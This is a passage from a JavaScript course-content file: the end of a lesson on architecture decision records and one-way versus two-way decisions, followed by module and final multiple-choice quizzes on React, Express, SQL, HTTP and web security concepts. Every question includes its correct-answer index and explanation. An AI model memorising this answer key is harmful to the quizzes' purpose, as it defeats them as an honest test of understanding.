            'Proof that the new implementation is faster under production load',
            'A rollback path that avoids redeploying the previous service build',
            'Real production inputs, including the shapes nobody thought to write',
            'Assurance that both code paths share one database connection pool',
          ], 2, 'Fixtures only contain the cases someone imagined, whereas shadowing replays every odd record and timezone your real users actually have.'),
          q('Midway through a data migration you read from the new store and fall back to the old one on a miss. Why must every fallback be counted and alerted on?', [
            'Each fallback roughly doubles the read latency for that request',
            'A silent fallback hides missing rows that make the next step unsafe',
            'The old store cannot be made read only while fallbacks still happen',
            'Fallback reads skip the cache, so the hit rate looks worse than it is',
          ], 1, 'The fallback masks an incomplete backfill, so without a counter you would stop writing to the old store while data it still holds is the only copy.'),
          q('A strangler migration has sat at \'dual write, read new with fallback\' for two years. What is the main cost of parking there?', [
            'Storage costs double because every row now exists in two places',
            'The fallback path drifts out of date and eventually starts failing',
            'The feature flag service runs out of evaluations at that volume',
            'Every feature is built twice and every bug reproduced in two systems',
          ], 3, 'A stalled migration taxes all future work, because both systems stay in the critical path and every change and every incident has to be handled in both.'),
        ]
      ),
      lesson('Technical Decisions a Team Can Live With', 13, `
A team argued for three weeks about Postgres against MongoDB, picked Postgres, and shipped. Fourteen months later two of those four people had moved on, a new engineer asked why the course content was not in a document store, and nobody could reconstruct the reasoning. So they argued again, for a week, and arrived at the same answer. The decision did not cost three weeks. It cost four, and it will cost more.

A decision nobody recorded is a decision you get to make again, with less information, at a worse moment.

### Write it down where the code lives

An architecture decision record is one page in the repository, numbered, added in the pull request that implements it.

\`\`\`markdown
# 0007. Postgres as the primary store

Status: Accepted, 2025-11-03

## Context
Enrolments, payments and progress are read together and must stay consistent.
Enrolling has to write two tables atomically. Team of four: two have run
Postgres in production, none has operated a Mongo cluster on call.

## Decision
Managed Postgres for all primary data. Redis for caches and rate limits only.

## Consequences
Good: transactions, joins, one operational surface, SQL for analytics.
Bad: schema changes become a release step, and document shaped lesson
content will live in JSONB with weaker validation than a schema gives.
Revisit if: one table passes roughly 200M rows, or sustained writes
exceed 5k/s.
\`\`\`

Four sections, fifteen minutes. When it stops being true you add ADR 0021 and mark 0007 \`Superseded by 0021\`, rather than editing it. The value is the record of what was known at the time, and an edited record cannot tell you that.

### Spend the argument budget on doors that open one way

| Decision | Door | Cost to reverse |
|---|---|---|
| Primary database engine | One way | Months: data migration plus rewritten queries |
| The URLs and payloads you publish | One way | A deprecation cycle on other people's schedules |
| Sessions or tokens for auth | Mostly one way | Every client and every service |
| CSS framework | Two way | A sprint of find and replace |
| Logging library | Two way | An afternoon behind a wrapper |
| Folder layout | Two way | One codemod |

Two way doors get decided in ten minutes, in the pull request, by whoever is doing the work. Three week debates about a logging library are exactly how the one way doors end up decided by accident, by whoever happened to type first.

### Boring on purpose, with a small budget for new

Give yourselves about two novelties, total. Everything else should be technology you can debug at 3am with a search engine and an error message. A new database, a new language and a new deploy target in one quarter means every incident has several suspects and nobody in the room has debugged any of them before.

### Debt gets paid when it has an owner and a trigger

"Refactor the enrolment service" on a backlog is immortal. Written as a cost with a condition, it becomes work someone can schedule and defend:

> The enrolment module writes to \`certificates\` directly. This blocks
> extracting certificates and doubled the length of the 14 March incident.
> Owner: Priya. Trigger: before the second certificate type ships, or end
> of Q3, whichever comes first.

### Then check whether you were right

Record what you expect: "moving PDF rendering to a queue should bring checkout p95 under 400ms". Six weeks later, look. Sometimes the answer is that it went to 380ms and the queue earned its complexity. Sometimes it is 520ms and the real cost was elsewhere, which is worth far more to know than to assume. Teams that never look back learn nothing from their own decisions, and keep making them at the same speed forever.
      `,
        [
          q('Why mark an old ADR \'Superseded by 0021\' instead of editing it to describe the newer choice?', [
            'The record of what was known and true at the time keeps its value',
            'Editing an accepted ADR invalidates the pull request that shipped it',
            'Numbered files must stay byte identical for the docs index to build',
            'A superseded status stops the same decision being reversed twice',
          ], 0, 'The point of the record is to explain the reasoning available at the time, and an edited document can no longer show why the original call made sense.'),
          q('Your team has spent three weeks comparing logging libraries. What does the one way and two way door framing say about that?', [
            'Logging is a one way door because its format feeds every dashboard',
            'Three weeks is proportionate given how many services emit logs',
            'It is a two way door, so decide fast and spend the debate elsewhere',
            'Any choice that reaches production deserves a fully written ADR',
          ], 2, 'Swapping a logging library behind a wrapper takes an afternoon, so the weeks spent there are weeks not spent on the choices that take months to undo.'),
          q('Which version of the same technical debt item is most likely to actually get fixed?', [
            '\'Refactor the enrolment service\' sitting on the backlog at medium',
            'The same work with a named owner and a trigger it must happen before',
            'A TODO comment in the file linking back to the original pull request',
            'A recurring quarterly reminder to review outstanding technical debt',
          ], 1, 'An owner and a concrete trigger turn debt into schedulable work with a deadline, while an unranked backlog entry has nobody accountable and no moment it becomes urgent.'),
        ]
      ),
      ],
      [
      q('A module owns its own tables and every caller reaches it through index.js. Why does that make extracting it into a service cheap?', [
        'Its tests already run without a database, so none of them need rewriting',
        'The lint rules can be reused unchanged by the new service repository',
        'Shared code has already been duplicated, so nothing at all has to move',
        'The implementation behind the same signature swaps for a network call',
      ], 3, 'Because callers only know the exported signature, the transport can change in one file and be reverted in one file if the split goes badly.'),
      q('Which change to a published API is safe for a client that ignores fields it does not recognise?', [
        'Adding a `certificateUrl` field to the enrolment response body',
        'Making the existing `startDate` request field required',
        'Changing the default page size from 100 items down to 20',
        'Returning 400 rather than 404 for an unknown course slug',
      ], 0, 'Adding a response field leaves every existing caller receiving exactly what it received before, which is what makes additive changes safe.'),
      q('You are about to move traffic onto a rewritten pricing calculator. Which sequence carries the least risk?', [
        'Cut over at a quiet hour, watch the error rate, roll back if it moves',
        'Restrict the new code to internal staff until the end of the quarter',
        'Shadow the new code, compare answers, then move traffic by percentage',
        'Deploy both, let each client pick with a header, then delete the old',
      ], 2, 'Shadowing surfaces disagreements on real production input while users are still served the known good answer, so the eventual cutover has evidence behind it.'),
      q('A team adopts a new database, a new language and a new deploy target in one quarter. What is the specific risk that creates?', [
        'The hiring pool for that exact combination of skills becomes small',
        'Every incident has several suspects and nobody has debugged any of them',
        'Licence costs compound because three vendors bill for the same workload',
        'Build times grow until the pipeline passes its maximum job duration',
      ], 1, 'Novelty spends the team\'s debugging knowledge, so an outage arrives with no one in the room who has seen that failure mode in production before.'),
      ]
    ),
  ],
  final: [
    q('Which status code should a successful POST that creates a resource return?', [
      '200',
      '201',
      '204',
      '302, which redirects the client to the new resource',
    ], 1, '201 Created signals a new resource exists, and the response should include it.'),
    q('const y = x assigns an object. Mutating y.count also changes x.count. Why?', [
      'Objects are copied by value on each assignment',
      'Both names reference the same object',
      'const makes objects shared',
      'It is a JavaScript bug',
    ], 1, 'Objects are assigned by reference; both bindings point at one object in memory.'),
    q('Which array method returns a new array rather than mutating in place?', [
      'push',
      'sort',
      'map',
      'splice',
    ], 2, 'map returns a new array. push, sort, and splice all mutate the original.'),
    q('A fetch call gets a 404. What does the promise do?', [
      'Rejects, triggering catch',
      'Resolves with res.ok === false',
      'Throws a TypeError',
      'Retries automatically up to three times',
    ], 1, 'fetch only rejects on network failure. Check res.ok for HTTP error statuses.'),
    q('Why does React require stable keys in lists?', [
      'To sort the list',
      'To match elements across renders and keep their state',
      'To make map() faster',
      'To generate a unique CSS class for each item in the list',
    ], 1, 'Keys tell React which DOM node corresponds to which item; unstable keys lose input state and focus.'),
    q('Where does a network request belong in a React component?', [
      'Directly in the component body',
      'Inside useEffect',
      'In the return statement',
      'In useState initialiser',
    ], 1, 'Rendering must stay pure. Side effects such as fetching belong in useEffect.'),
    q('What does ON DELETE CASCADE do?', [
      'Prevents deleting the parent row while children exist',
      'Deletes child rows when the parent is deleted',
      'Copies rows to a backup table',
      'Marks rows as archived',
    ], 1, 'It removes dependent rows automatically, so no orphaned children remain.'),
    q('Why parameterise SQL queries instead of building strings?', [
      'Parameters are faster to parse',
      'Values are sent separately from the statement, so input cannot become SQL',
      'It keeps queries shorter',
      'It enables the database to use indexes on every column named in the WHERE clause',
    ], 1, 'Parameterisation is the defence against SQL injection — the value can never be interpreted as code.'),
    q('Which belongs in an environment variable rather than source code?', [
      'The port number for local development',
      'The JWT signing secret',
      'A CSS colour token',
      'The list of route paths',
    ], 1, 'Secrets must never be committed. A leaked JWT secret lets anyone forge tokens for any account.'),
    q('In production, why serve the React build from the Express server?', [
      'React cannot run in the browser without a Node server delivering the files',
      'It gives one origin, avoiding CORS and allowing relative API URLs',
      'It disables client-side routing',
      'Static files require Express',
    ], 1, 'Single-origin serving removes cross-origin complexity and lets the client call /api/... relatively.'),
    q('A request returns 200 with exactly the JSON you expect, but the page stays empty. Where do you look first?', [
      'The database query plan',
      'The Express error handler',
      'The CORS configuration on the server',
      'The React state and rendering code',
    ], 3, 'A correct response proves every server layer succeeded, leaving only how the component stores and renders that data.'),
    q('Why do API tests import a createApp() factory instead of the module that calls app.listen()?', [
      'A listening server keeps an open handle, so the test run never exits',
      'Supertest requires the app to be running on port 3000 before it can send requests',
      'app.listen() removes middleware from the stack',
      'Express applications cannot be exported from ES modules',
    ], 0, 'Supertest binds its own ephemeral port, so importing a module that listens leaves Node alive after the suite finishes.'),
    q('An endpoint issues one query for the list and one more per row. What is wrong, and why does it only hurt in production?', [
      'A deadlock: the per-row queries lock each other, which only happens under real production traffic',
      'A connection leak — every query opens a new pool',
      'An N+1 query: round trips are near-free locally but cost milliseconds each over a network',
      'A cache miss — the rows were evicted between queries',
    ], 2, 'The cost is latency per round trip, invisible against a local database and worth seconds against a remote one.'),
    q('Which sequence lets you roll the application back safely after a schema change?', [
      'Rename the column and deploy the code using the new name in the same release, then run the migration',
      'Add the new column, write to both, backfill, then drop the old column in a later release',
      'Drop the old column first so nothing can read stale data',
      'Apply every migration only after the new code has finished rolling out',
    ], 1, 'Expand, migrate, contract keeps the previous version working against the new schema, which is exactly what a rollback needs.'),
    q('An offline-capable client queues credit top-ups in IndexedDB and flushes them on reconnect, generating a fresh UUID for the Idempotency-Key header each time it sends an item. One flush times out after the server has already committed the charge, so the item is sent again. What is the result?', [
      'The server matches the request fingerprint instead of the key and returns the first response',
      'The unique constraint on the key table rejects the second attempt with a 409 conflict',
      'The queue discards the item, because a timeout is treated the same way as a 4xx failure',
      'The server sees an unknown key, treats it as a new request, and the learner is charged twice',
    ], 3, 'An idempotency key has to be generated once, when the write is queued, and repeated on every attempt, because a key minted per attempt is simply a second request in disguise and the server has nothing to recognise the replay by.'),
    q('Session cookies are HttpOnly, Secure and SameSite=Lax, and a double submit CSRF check runs on every method except GET, HEAD and OPTIONS. Which endpoint can still be fired by a link a learner clicks in an email?', [
      'POST /api/enrolments/42/cancel, because a cross site form post still carries the cookie',
      'GET /api/enrolments/42/cancel, because Lax still sends the cookie on a top level navigation',
      'DELETE /api/enrolments/42, because fetch attaches the cookie to any request it can send',
      'PUT /api/enrolments/42, because a request with a JSON body needs no preflight to be sent',
    ], 1, 'SameSite=Lax withholds the cookie from cross site subrequests but still attaches it when the user navigates at the top level, and the CSRF middleware deliberately exempts GET, so any endpoint that changes state on GET is left unguarded by both defences at once.'),
    q('A checkout handler opens a transaction, runs SELECT seatsLeft FROM cohorts WHERE id = 12 FOR UPDATE, awaits a payment API whose p99 is 900ms, then commits. Seat counts are always correct, but during a sale every checkout for that cohort crawls. Why?', [
      'FOR UPDATE escalates to a table lock, so every cohort in the table is unavailable meanwhile',
      'READ COMMITTED lets the next reader see the uncommitted count, so it retries in a tight loop',
      'The row lock is held until COMMIT, so every other writer on that row waits out the charge',
      'The pooled connection is handed to another request during the await, so the work is redone',
    ], 2, 'A row taken with FOR UPDATE stays locked until the transaction commits, so awaiting a 900ms third party call inside it makes every other writer for that row queue behind the payment provider; external work belongs after COMMIT so transactions stay short.'),
    q('The browser retries a failed enrolment up to three times, the API wraps its call to the payment provider in three attempts, and the worker that completes the job also retries three times. The provider begins answering 503. What does one tap on Enrol now do?', [
      'Sends up to twenty seven requests, flooding a dependency that is already struggling',
      'Sends up to nine requests, because only the layer nearest the dependency really retries',
      'Sends three requests, because 503 is not retryable at the outer two layers of the stack',
      'Sends one request, because the circuit breaker opens before a second attempt is made',
    ], 0, 'Retries multiply rather than add across layers, so three attempts at each of three levels is up to twenty seven calls for a single user action, which is why retry logic belongs in exactly one place, normally the layer closest to the dependency.'),
    q('A team shadows its rewritten enrolment pipeline: the old code serves the answer while the new code runs on every real request and its output is diffed in the logs. Two weeks in, learners report duplicate confirmation emails and some double charges. What went wrong?', [
      'The diff ran in a microtask, so the new code executed before the old answer was returned',
      'Shadowing belongs on sampled traffic only, and running it on every request doubled the load',
      'The old pipeline should have been the shadow, since the new one was already authoritative',
      'The new pipeline was allowed real side effects, so every shadowed call genuinely happened',
    ], 3, 'Shadow traffic is only safe for reads and pure computations, because a shadowed path that sends mail or charges a card performs that effect a second time, so the candidate must run in a dry run mode that touches nothing outside itself.'),
    q('A mentor is removed from cohort 42 at 14:05, and from that instant every HTTP request they make is refused. Their already open WebSocket keeps receiving cohort 42 messages until they close the tab. What explains it, and what closes the gap?', [
      'Redis pub/sub replayed the backlog to them after removal, so backfill from a cursor instead',
      'The socket was authorised only at join time, so emit a revoke that removes it from the room',
      'Rooms are per instance, so the removal reached one process only; publish the change on the bus',
      'Their session cookie is valid until Max-Age expires, so shorten it and the socket will drop',
    ], 1, 'A socket is authorised at the handshake or at join time and then stays open for hours without consulting the database again, so a permission revoked mid session has no effect until something removes the socket from the room or forces a reconnect.'),
    q('A `.toolbar` uses `display: flex` with the default row direction. Which declaration centres its children vertically within the bar?', [
      'justify-content: center',
      'align-items: center',
      'text-align: center',
      'vertical-align: middle',
    ], 1, 'In a row flex container the cross axis is vertical, and align-items controls the cross axis; justify-content works along the main, horizontal axis.'),
    q('A learner on café Wi-Fi opens `https://learn.example.com/courses?q=react`. What can someone watching that network still see?', [
      'The full URL including ?q=react, but not the page body',
      'Nothing at all, since HTTPS also hides which site it is',
      'The page body, since HTTPS encrypts only submitted forms',
      'The hostname learn.example.com, but not the path or query',
    ], 3, 'HTTPS encrypts the path, query, headers, cookies and body, but the DNS lookup and the TLS handshake still reveal which hostname was visited.'),
    q('`ids.forEach(async (id) => { await save(id); }); console.log(\'all saved\');` What is wrong with this code?', [
      '\'all saved\' logs before the saves finish, as forEach ignores promises',
      'The saves run one after another, so it is slow but correct, and the log line prints last',
      'forEach throws, since it cannot accept an async callback',
      'Only the first id is saved, since await stops the forEach loop',
    ], 0, 'forEach calls each async callback and discards the promise it returns, so nothing waits; use for...of with await to run in order, or await Promise.all(ids.map(save)) to run them together.'),
    q('`const copy = { ...user }; copy.address.city = \'Lahore\';` What happens to `user.address.city`?', [
      'It stays unchanged, since spread makes a deep copy',
      'It becomes undefined, since address moved into copy',
      'It also becomes \'Lahore\', since spread copies one level',
      'It throws, since objects made by spread are frozen',
    ], 2, 'Spread creates a new top-level object, but nested objects are copied by reference, so copy.address and user.address are the same object.'),
    q('Prices `[10, 9, 1, 100]` should end up in ascending numeric order. What does calling `.sort()` on them with no arguments return?', [
      '[1, 9, 10, 100]',
      '[1, 10, 100, 9]',
      '[100, 10, 9, 1]',
      '[10, 9, 1, 100], unchanged because sort needs a compare function',
    ], 1, 'Without a compare function, sort converts elements to strings and orders them character by character, so "100" comes before "9"; pass (a, b) => a - b for numeric order.'),
    q('An input is rendered as `<input value={email} />`, where email is a string held in state, and there is no onChange handler. What happens when the user types into it?', [
      'The text appears, and email state updates automatically',
      'The text appears, but the email state keeps its old value until you submit',
      'React throws an error and unmounts the whole form',
      'Nothing changes, since React holds the field at the state value',
    ], 3, 'A value prop makes the input controlled, so React keeps it equal to email; without an onChange that updates state, every keystroke is discarded and the field is effectively read-only.'),
    q('With `count` at 5, a click handler runs `setCount(count + 1); console.log(count);`. What is logged?', [
      '5',
      '6',
      'undefined',
      'Either 5 or 6, depending on render timing',
    ], 0, 'State is a snapshot for each render: the setter schedules a re-render with 6, but the count variable inside this handler stays 5.'),
    q('A component keeps `visibleCourses` in state and uses a useEffect to recalculate it whenever `courses` or `query` change. What is the better design?', [
      'Put visibleCourses in a context so any component can update it',
      'Add visibleCourses to the effect\'s dependency array as well',
      'Compute visibleCourses from courses and query during render',
      'Keep visibleCourses in a ref so updating it skips a re-render',
    ], 2, 'A value derived from props and state should be calculated while rendering (with useMemo if it is expensive); syncing it through an effect costs an extra render and briefly shows stale results.'),
    q('`POST /api/users` arrives with a valid body whose email is already registered. Which status code fits?', [
      '401 Unauthorized',
      '409 Conflict',
      '403 Forbidden',
      '500 Internal Server Error',
    ], 1, 'The request is well formed but clashes with existing state, which is what 409 Conflict signals; 401 and 403 concern authentication and permission, and 500 means the server broke.'),
    q('A route `/api/courses/:id` looks up `courses.find((c) => c.id === req.params.id)`, where every `c.id` is a number. Every request returns 404. Why?', [
      'Route parameters are only available in req.query',
      'find returns a promise, so it must be awaited first',
      'Express strips numeric segments before routing',
      'req.params values are strings, so \'7\' never === 7',
    ], 3, 'Everything parsed from the URL arrives as a string, and strict equality never matches a string with a number; convert with Number(req.params.id) before comparing.'),
    q('A client sends only `{ "title": "New title" }` to update course 7. Which request matches REST conventions?', [
      'PATCH /courses/7, changing the title and leaving other fields',
      'PUT /courses/7, changing the title and leaving other fields',
      'POST /courses, since every change to data is a POST',
      'GET /courses/7?title=New, since the change is small',
    ], 0, 'PATCH applies a partial update, while PUT replaces the whole resource with the body sent, so a body containing only the title belongs in a PATCH.'),
    q('Learners can enrol in many courses, and each course has many learners. How is this modelled in a relational database?', [
      'A courseIds column on users holding a comma-separated list',
      'A learnerId column on courses, repeated for each learner',
      'An enrolments table with a learnerId and a courseId per row',
      'A copy of each course row for every learner who enrols',
    ], 2, 'A many-to-many relationship needs a join table whose rows each link one learner to one course through foreign keys, so constraints, indexes and joins all work.'),
    q('At login, how should the server check a submitted password against the stored bcrypt hash?', [
      'Decrypt the stored hash and compare it with the password',
      'Call bcrypt.compare(password, storedHash)',
      'Hash the password with bcrypt.hash and compare the strings',
      'Compare a SHA-256 of the password with the stored hash',
    ], 1, 'bcrypt.compare reads the salt and cost embedded in the stored hash and re-hashes the password with them; a fresh bcrypt.hash uses a new random salt, so its output never matches.'),
    q('The React app hides the Delete button from non-admins, and `DELETE /api/courses/:id` only checks that the token is valid. What is the problem?', [
      'Admins can no longer delete, since the button check blocks them',
      'Nothing, since users cannot send requests without the button',
      'The token check reveals the list of admins to every learner',
      'Any logged-in user can call the endpoint directly and delete',
    ], 3, 'Hiding a button is presentation, not security; the server must check the user\'s role on every request, because anyone can send the request with curl.'),
    q('A component fetches courses on mount and then renders \'React Basics\'. Which assertion correctly waits for that text to appear?', [
      'expect(await screen.findByText(\'React Basics\')).toBeInTheDocument()',
      'expect(screen.getByText(\'React Basics\')).toBeInTheDocument(); // runs immediately',
      'expect(screen.queryByText(\'React Basics\')).toBeNull()',
      'expect(screen.getAllByText(\'React Basics\')).toHaveLength(0)',
    ], 0, 'findBy queries return a promise that retries until the element appears or a timeout passes; getBy throws at once, before the fetch has resolved.'),
    q('Why keep end-to-end browser tests to a few critical journeys, such as register, enrol and open chapter one, and cover edge cases with API and component tests?', [
      'End-to-end tests cannot reach the database, so they miss bugs',
      'Browsers cap how many automated tests one project can run',
      'End-to-end tests are slower and more fragile to maintain',
      'End-to-end tests only work on pages that need no login',
    ], 2, 'A browser test is the only proof that the layers join up, but it is slow and has many moving parts, so detail is cheaper and more reliable to check lower down.'),
    q('A course list endpoint already returns 30 rows per page, but it runs `SELECT *`, and each row carries a 200 KB body column the list never shows. What is the fix?', [
      'Add an index on the body column to speed up each row read',
      'Select only the columns the list renders',
      'Cache the full rows in localStorage',
      'Switch the endpoint from GET to POST',
    ], 1, 'Each page hauls about 6 MB of bodies nobody sees; naming just the needed columns cuts both the transfer and the database\'s work.'),
    q('Every visitor downloads the admin dashboard\'s code on their first page load, though few are admins. Which change helps most?', [
      'Wrap every admin component in memo()',
      'Move the admin state into a React context',
      'Wrap the admin route list in useMemo',
      'Load admin pages with lazy() and Suspense',
    ], 3, 'Route-level code splitting with lazy(() => import(...)) moves the admin code into its own chunk that downloads only when an admin page is opened.'),
    q('Behind a load balancer with three API instances, avatars saved to each instance\'s local `uploads/` folder load only about a third of the time. What is the fix?', [
      'Store uploads in shared object storage all instances use',
      'Enable gzip so the images transfer faster between the instances and users',
      'Raise the body size limit in express.json()',
      'Restart the instances so their folders sync',
    ], 0, 'A file on one machine\'s disk 404s whenever the load balancer sends the request elsewhere; a process may hold nothing the next request needs, so files belong in a shared store.'),
    q('An SSE endpoint sends `id:` with every event. After the connection drops and the browser reconnects, how does the server know where to resume?', [
      'The server replays every event since the stream first opened',
      'EventSource buffers missed events and asks for them by index',
      'The browser sends a Last-Event-ID header with the last id seen',
      'It cannot, so SSE clients must reload the page after a drop',
    ], 2, 'EventSource reconnects on its own and sends the last id it received in a Last-Event-ID header, so the server can send only what came after it.'),
    q('A leaderboard changes every few minutes but is polled every 10 seconds. Which change makes each unchanged poll close to free?', [
      'Switch to a WebSocket that resends the whole board every 10s',
      'Send an ETag and answer a matching If-None-Match with 304',
      'Add Cache-Control: no-store so browsers never reuse it',
      'Poll every second so each response carries less new data',
    ], 1, 'A conditional request lets the server answer 304 Not Modified with no body, and a cheap version check can skip the expensive query entirely.'),
    q('The API uses `cors({ origin: \'https://yoursite.com\' })`. An attacker calls it with curl from their own machine. What does that CORS setting do about it?', [
      'It rejects the request, since the Origin header does not match',
      'It blocks the attacker\'s IP address after the first mismatch',
      'It makes curl attach the site\'s cookies to the request',
      'Nothing, since CORS is enforced by browsers, not servers',
    ], 3, 'CORS only tells browsers whether scripts from another origin may read a response; curl ignores it, so the API must still authenticate and authorise every request.'),
    q('An XSS bug lets an attacker\'s script run on your pages, but the session cookie is HttpOnly. What can the script still do?', [
      'Send requests as the victim, since the browser attaches the cookie',
      'Nothing, since HttpOnly blocks every request a script makes to your own API',
      'Read the cookie value, but not use it in any request',
      'Act only on the attacker\'s own account, not the victim\'s',
    ], 0, 'HttpOnly stops script from reading the cookie, but requests the script makes from the victim\'s page still carry it, so the attacker can act as the victim while the page is open.'),
    q('Two requests race to spend a learner\'s last credit. Which approach guarantees only one of them succeeds, without an explicit lock?', [
      'SELECT the balance first, then UPDATE it to a new value computed in JavaScript',
      'Read the balance twice to confirm it, then write the new balance back',
      'UPDATE ... credits = credits - 1 WHERE userId = ? AND credits > 0, checking rows',
      'Wrap the SELECT and the computed UPDATE in a READ COMMITTED transaction',
    ], 2, 'The database does the arithmetic while holding the row lock, and the credits > 0 guard makes the losing request update zero rows, which the handler turns into a 409.'),
    q('A refund handler adds credits back to the wallet, then deletes the enrolment, as two statements with no transaction. The process restarts between them. What state is left behind?', [
      'Neither change, since the database undoes the first statement',
      'Credits refunded but the enrolment kept, a state that should not exist',
      'The enrolment deleted but no credits refunded, since deletes run first',
      'Both changes, since the database replays the missing statement',
    ], 1, 'Without a transaction each statement commits on its own, so the first survives and the second never runs; wrapping both in one transaction makes them succeed or fail together.'),
    q('Two instructors open the same course description and both save; the second save silently overwrites the first. Which change makes the second save fail visibly instead?', [
      'Wrap each save in its own database transaction with a retry on failure',
      'Add a unique index on the course\'s id column',
      'Save each edit twice to confirm that it stuck',
      'Update only WHERE version matches, else return 409',
    ], 3, 'Sending the version the editor loaded and updating only when it still matches turns a silent lost update into a 409 the client can show, reload and merge.'),
    q('Service A calls service B over HTTP, but B\'s spans show up as separate traces rather than as children of A\'s request. What is the most likely cause?', [
      'A\'s outgoing call does not pass on the traceparent header',
      'B writes its logs in a different time zone from A, so timestamps cannot line up',
      'B listens on a different port and host from A',
      'B runs on a newer Node.js release than A does',
    ], 0, 'Trace context travels in the W3C traceparent header; if the caller does not send it, B has no parent span to attach to and starts a fresh trace.'),
    q('Which alert is most worth waking an engineer for at 02:00?', [
      'Average CPU on one instance above 80% for five minutes',
      'Disk usage on the log volume has passed 60 percent',
      'Checkout\'s 5xx rate is burning the error budget fast',
      'The nightly backup ran four minutes longer than usual',
    ], 2, 'Pages should fire on symptoms users feel, such as failing checkouts eating the error budget; high CPU or a slower backup often needs no action and only trains people to ignore alerts.'),
    q('A public API must rename `title` to `name` in course responses without breaking existing clients. What is the safe sequence?', [
      'Rename it in a single release and update the docs that day',
      'Add name beside title, deprecate title, remove it once unused',
      'Send name only to clients whose User-Agent looks recent',
      'Swap the field over a weekend, when traffic is lowest',
    ], 1, 'Adding the new field is safe for clients that ignore unknown fields; measuring usage and announcing deprecation lets title be removed only when nothing still reads it.'),
    q('Why does replacing a component behind an interface on the main branch, switched by a flag, usually beat a long-lived rewrite branch?', [
      'Flags make the new code run faster than the old code',
      'A long-lived branch cannot be run through CI at all',
      'Work on the main branch needs no tests before release',
      'Changes merge continuously, and the switch is reversible',
    ], 3, 'Small merges keep the new code in step with ongoing changes instead of drifting, and a flag lets traffic move gradually and move back at once if something breaks.'),
  ],
});
